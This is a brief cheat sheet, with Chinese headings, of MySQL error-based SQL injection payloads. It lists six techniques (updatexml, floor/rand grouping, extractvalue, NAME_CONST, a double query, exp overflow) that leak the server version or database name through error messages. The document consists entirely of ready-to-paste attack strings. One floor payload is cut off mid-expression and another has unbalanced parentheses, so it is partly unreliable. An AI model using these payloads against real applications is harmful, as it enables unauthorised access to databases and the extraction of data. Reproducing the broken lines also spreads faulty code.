1.xmlupdate

```javascript
and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)
```

2.floor

通过floor报错：

```javascript
and select 1 from (select count(*),concat(version(),floor(rand(0)*2))x 
from information_schema.tables group by x)a)

and (select count(*) from (select 1 union select null union select  !1)x
 group by concat((select version
```

3.   通过ExtractValue报错：

```javascript
and extractvalue(1, concat(0x7f, (select version()),0x7f))
```

4. 通过NAME_CONST报错：

```javascript
and 1=(select * from (select NAME_CONST(version(),1),
NAME_CONST(version(),1)) as x)
```

5.  通过错误的双重查询：

```javascript
or 1 group by concat_ws(0x7f,version(),floor(rand(0)*2)) having min(0) or 1
```

6.通过exp报错

```javascript
'or EXP(~(SELECT * from(select database())a))#
```





